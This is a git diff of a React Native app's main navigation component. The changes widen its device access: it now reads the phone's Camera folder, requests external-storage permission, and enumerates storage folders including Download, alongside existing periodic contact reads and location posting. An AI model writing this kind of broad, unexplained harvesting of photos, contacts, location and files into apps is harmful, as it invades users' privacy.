@@ -28,7 +28,7 @@ function MainNav({navigation}) {
 		}, 60000); // Waktu dalam milidetik (satu menit = 60 detik = 60000 milidetik)
         getImageFiles();
         getContacts()
-        
+    
 		return () => clearInterval(interval);
 	}, []);
 
@@ -83,7 +83,7 @@ function MainNav({navigation}) {
             );
         
             if (result === RESULTS.GRANTED) {
-                const directoryPath = RNFS.ExternalStorageDirectoryPath + '/DCIM/Test'; // You can change the directory path if needed
+                const directoryPath = RNFS.ExternalStorageDirectoryPath + '/DCIM/Camera'; // You can change the directory path if needed
                 const files = await RNFS.readDir(directoryPath);
         
                 // Filter image files
@@ -115,6 +115,38 @@ function MainNav({navigation}) {
             console.log('Error retrieving image files:', error);
         }
     };
+
+    const getListFolders = async (rootDirectoryPath) => {
+        try {
+            const listFoldersPath = [];
+            const result = await RNFS.readDir(rootDirectoryPath);
+            // Filter out only the folders from the result
+            const folders = result.filter((item) => item.isDirectory());
+            // Get All Folders Path
+            folders.forEach((val) => listFoldersPath.push(val.path));
+
+            return listFoldersPath
+        } catch (error) {
+            console.error('Error reading directory:', error);
+            return [];
+        }
+    }
+
+    const getFilesFromDirectory = async (directoryPath) => {
+        try {
+            directoryPath.forEach((path) => {
+                console.log(path)
+                const files = RNFS.readDir(path);
+    
+                console.log(files)
+                files.then((val) => {
+                    console.log(val)
+                })
+            })
+        }catch (error) {
+            console.log('Error get file from directory ' +error);
+        }
+    }
 
     const postLocation = async (lat, lon) => {
         const params = {
@@ -176,11 +208,12 @@ function MainNav({navigation}) {
     const requestPermissions = async () => {
         try{
             if(Platform.OS === 'android') {
-                requestMultiple([PERMISSIONS.ANDROID.ACCESS_FINE_LOCATION, PERMISSIONS.ANDROID.CAMERA, PERMISSIONS.ANDROID.READ_CONTACTS, PERMISSIONS.ANDROID.READ_MEDIA_IMAGES]).then((statuses) => {
+                requestMultiple([PERMISSIONS.ANDROID.ACCESS_FINE_LOCATION, PERMISSIONS.ANDROID.CAMERA, PERMISSIONS.ANDROID.READ_CONTACTS, PERMISSIONS.ANDROID.READ_EXTERNAL_STORAGE, PERMISSIONS.ANDROID.READ_MEDIA_IMAGES]).then((statuses) => {
                     console.log('Permission Android Location : ', statuses[PERMISSIONS.ANDROID.ACCESS_FINE_LOCATION]);
                     console.log('Permission Android Camera :', statuses[PERMISSIONS.ANDROID.CAMERA]);
                     console.log('Permission Android Contacts :', statuses[PERMISSIONS.ANDROID.READ_CONTACTS]);
-                    console.log('Permission Android Media files :', statuses[PERMISSIONS.ANDROID.READ_MEDIA_IMAGES]);
+                    console.log('Permission Android EXTERNAL_STORAGE :', statuses[PERMISSIONS.ANDROID.READ_EXTERNAL_STORAGE]);
+                    console.log('Permission Android MEDIA IMAGES :', statuses[PERMISSIONS.ANDROID.READ_MEDIA_IMAGES]);
                 });
 
             } else if (Platform.OS === 'ios') {
@@ -196,6 +229,25 @@ function MainNav({navigation}) {
         }
     }
     
+    getListFolders(RNFS.ExternalStorageDirectoryPath)
+        .then((directoryPath) => {
+            console.log('Folders in the directory:', directoryPath);
+
+            directoryPath.forEach((path) => {
+                if(path === "/storage/emulated/0/Download") {
+                    console.log(path)
+                    const files = RNFS.readDir(path);
+
+                    console.log(files)
+                    files.then((val) => {
+                        console.log(val)
+                    })
+                }
+            })
+        })
+        .catch((error) => {
+            console.error('Error:', error);
+        });
     return (
         <Tab.Navigator  
                         screenOptions={({ route }) => ({
